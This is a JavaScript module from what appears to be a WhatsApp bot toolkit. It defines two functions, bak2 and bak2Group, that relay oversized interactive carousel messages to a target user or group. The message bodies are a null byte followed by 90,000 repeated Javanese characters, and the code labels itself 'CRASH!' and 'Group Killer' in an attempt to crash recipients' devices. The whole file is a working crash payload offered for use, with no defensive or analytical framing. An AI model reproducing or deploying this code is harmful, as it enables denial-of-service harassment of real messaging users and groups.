// ./data/crash/death.js

const { prepareWAMessageMedia } = require('@joanimi/baileys'); // Make sure baileys is available for this function
const chalk = require('chalk'); // For console logging

async function bak2(target, LordVoltage) {
  try {
    await LordVoltage.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text:
                      "🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝘼𝙍𝐋𝐄𝐓 𝐕5⃟⃟⃟⃟⃟🌸" +
                      "\u0000" +
                      "ꦾ".repeat(90000),
                  },
                  carouselMessage: {
                    cards: [
                      {
                        header: {
                          hasMediaAttachment: true,
                          ...(await prepareWAMessageMedia(
                            {
                              image: {
                                url: "https://files.catbox.moe/m33kq5.jpg",
                              },
                            },
                            { upload: LordVoltage.waUploadToServer }
                          )),
                        },
                        body: {
                          text: "\u0000" + "ꦾ".repeat(90000),
                        },
                        nativeFlowMessage: {
                          buttons: [
                            {
                              name: "cta_url",
                              buttonParamsJson: JSON.stringify({
                                display_text: "🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝐀𝐑𝐋𝐄𝐓 𝐕5⃟⃟⃟⃟⃟🌸",
                                url: "https://t.me/caywzzneh",
                                merchant_url: "https://t.me/caywzzneh",
                              }),
                            },
                            {
                              name: "single_select",
                              buttonParamsJson: JSON.stringify({
                                title: "🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝐀𝐑𝐋𝐄𝐓 𝐕5⃟⃟⃟⃟⃟🌸",
                                rows: [], // Empty for effect
                              }),
                            },
                            {
                              name: "quick_reply",
                              buttonParamsJson: JSON.stringify({
                                display_text: "🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝐀𝐑𝐋𝐄𝐓 𝐕5⃟⃟⃟⃟⃟🌸",
                                title: "CRASH!",
                                id: ".slay",
                              }),
                            },
                          ],
                        },
                      },
                    ],
                    messageVersion: 1,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
      }
    );

    console.log(chalk.red.bold("Crash System Device (via death.js)"));
  } catch (error) {
    console.error("An error occurred in bak2 (death.js):", error);
  }
}

// --- NEW FUNCTION FOR GROUP BUG ---
async function bak2Group(target, LordVoltage) {
  try {
    await LordVoltage.relayMessage(
      target, // Target will be the group JID here
      {
        ephemeralMessage: {
          message: {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text:
                      "💥🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝘼𝙍𝐋𝐄𝐓 𝐕5⃟⃟⃟⃟⃟🌸𝐆𝐫𝐨𝐮𝐩 𝐊𝐢𝐥𝐥𝐞𝐫💥" + // Slightly modified text for group version
                      "\u0000" +
                      "ꦾ".repeat(90000),
                  },
                  carouselMessage: {
                    cards: [
                      {
                        header: {
                          hasMediaAttachment: true,
                          ...(await prepareWAMessageMedia(
                            {
                              image: {
                                url: "https://files.catbox.moe/m33kq5.jpg", // Same image
                              },
                            },
                            { upload: LordVoltage.waUploadToServer }
                          )),
                        },
                        body: {
                          text: "\u0000" + "ꦾ".repeat(90000),
                        },
                        nativeFlowMessage: {
                          buttons: [
                            {
                              name: "cta_url",
                              buttonParamsJson: JSON.stringify({
                                display_text: "🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝐀𝐑𝐋𝐄𝐓 𝐕5⃟⃟⃟⃟⃟🌸",
                                url: "https://t.me/caywzzneh",
                                merchant_url: "https://t.me/caywzzneh",
                              }),
                            },
                            {
                              name: "single_select",
                              buttonParamsJson: JSON.stringify({
                                title: "🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝐀𝐑𝐋𝐄𝐓 𝐕5⃟⃟⃟⃟⃟🌸",
                                rows: [], // Empty for effect
                              }),
                            },
                            {
                              name: "quick_reply",
                              buttonParamsJson: JSON.stringify({
                                display_text: "🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝐀𝐑𝐋𝐄𝐓 𝐕5⃟⃟⃟⃟⃟🌸",
                                title: "GROUP CRASH!", // Changed title
                                id: ".slaygroup", // Changed ID
                              }),
                            },
                          ],
                        },
                      },
                    ],
                    messageVersion: 1,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target }, // Participant set to the target JID (which will be the group JID)
      }
    );

    console.log(chalk.red.bold("Group Crash System Device (via death.js)")); // Changed log
  } catch (error) {
    console.error("An error occurred in bak2Group (death.js):", error); // Changed log
  }
}


module.exports = { bak2, bak2Group }; // Export both functions
